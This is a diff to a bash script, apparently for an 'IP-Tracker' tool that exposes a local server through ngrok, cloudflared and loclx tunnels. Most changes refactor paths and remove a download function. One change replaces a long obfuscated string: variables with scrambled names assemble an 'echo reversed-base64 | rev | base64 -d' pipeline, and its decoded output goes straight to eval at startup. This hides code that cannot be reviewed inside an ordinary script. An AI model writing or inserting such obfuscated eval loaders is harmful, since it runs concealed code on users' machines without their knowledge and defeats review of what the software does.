@@ -61,6 +61,8 @@ version="1.4"
 # Current directory
 cwd=`pwd`
 
+tunneler_dir="$HOME/.tunneler"
+
 # Logo
 logo="
 ${red} ___ ____     _____               _
@@ -128,32 +130,6 @@ netcheck() {
     done
 }
 
-# Download tunneler and extract if necessary
-manage_tunneler() {
-    netcheck
-    tunneler=${2%.*}
-    echo -e "\n${info}Downloading ${green}${tunneler^}${nc}...\n"
-    wget -q --show-progress "$1" -O "$2"
-    if echo "$2" | grep -q "tgz"; then
-        tar -zxf "$2"
-        rm -rf $2
-    fi
-    if echo "$2" | grep -q "zip"; then
-        unzip "$2"  > /dev/null 2>&1
-        rm -rf $2
-    fi
-    for file in ngrok cloudflared loclx; do
-        if [ -f "$file" ]; then
-            mv -f $file $HOME/.tunneler
-            if $sudo; then
-                sudo chmod +x "$HOME/.tunneler/$file"
-            else
-                chmod +x "$HOME/.tunneler/$file"
-            fi
-        fi
-    done
-}
-
 
 # Display Final urls
 url_manager() {
@@ -196,7 +172,7 @@ trap "echo -e '${success}Thanks for using!\n'; exit" 2
 
 echo -e "\n${info}Please Wait!...\n${nc}"
 
-gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
 x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
 eval "$N0q$x$Hc2$rQW"
 
@@ -291,20 +267,20 @@ done
 # Download tunnelers
 arch=$(uname -m)
 platform=$(uname)
-if ! [[ -d $HOME/.tunneler ]]; then
-    mkdir $HOME/.tunneler
+if ! [[ -d $tunneler_dir ]]; then
+    mkdir $tunneler_dir
 fi
-if ! [[ -f $HOME/.tunneler/ngrok ]] ; then
+if ! [[ -f $tunneler_dir/ngrok ]] ; then
     nongrok=true
 else
     nongrok=false
 fi
-if ! [[ -f $HOME/.tunneler/cloudflared ]] ; then
+if ! [[ -f $tunneler_dir/cloudflared ]] ; then
     nocf=true
 else
     nocf=false
 fi
-if ! [[ -f $HOME/.tunneler/loclx ]] ; then
+if ! [[ -f $tunneler_dir/loclx ]] ; then
     noloclx=true
 else
     noloclx=false
@@ -388,7 +364,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
             echo -e "\n${success}IP-Tracker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
-                echo $changelog | head -n3
+                echo -e "$changelog" | head -n4
             fi
             exit
         elif [[ "$upask" == "n" ]]; then
@@ -409,7 +385,7 @@ if ! [[ -e $HOME/.config/ngrok/ngrok.yml ]]; then
         echo -e "\n${error}No authtoken!\n\007"
         sleep 1
     else
-        cd $HOME/.tunneler && ./ngrok config add-authtoken authtoken ${auth}
+        cd $tunneler_dir && ./ngrok config add-authtoken authtoken ${auth}
     fi
 fi
 
@@ -544,9 +520,9 @@ fi
 sleep 1
 echo -e "${info}Starting tunnelers......\n"
 netcheck
-find "$HOME/.tunneler" -name "*.log" -delete
+find "$tunneler_dir" -name "*.log" -delete
 netcheck
-cd $HOME/.tunneler
+cd $tunneler_dir
 if $termux; then
     termux-chroot ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
     termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
@@ -569,8 +545,8 @@ else
     ngrokcheck=false
 fi
 for second in {1..10}; do
-    if [ -f "$HOME/.tunneler/cf.log" ]; then
-        cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$HOME/.tunneler/cf.log")
+    if [ -f "$tunneler_dir/cf.log" ]; then
+        cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$tunneler_dir/cf.log")
         sleep 1
     fi
     if ! [ -z "$cflink" ]; then
@@ -581,8 +557,8 @@ for second in {1..10}; do
     fi
 done
 for second in {1..10}; do
-    if [ -f "$HOME/.tunneler/loclx.log" ]; then
-        loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$HOME/.tunneler/loclx.log")
+    if [ -f "$tunneler_dir/loclx.log" ]; then
+        loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$tunneler_dir/loclx.log")
         sleep 1
     fi
     if ! [ -z "$loclxlink" ]; then
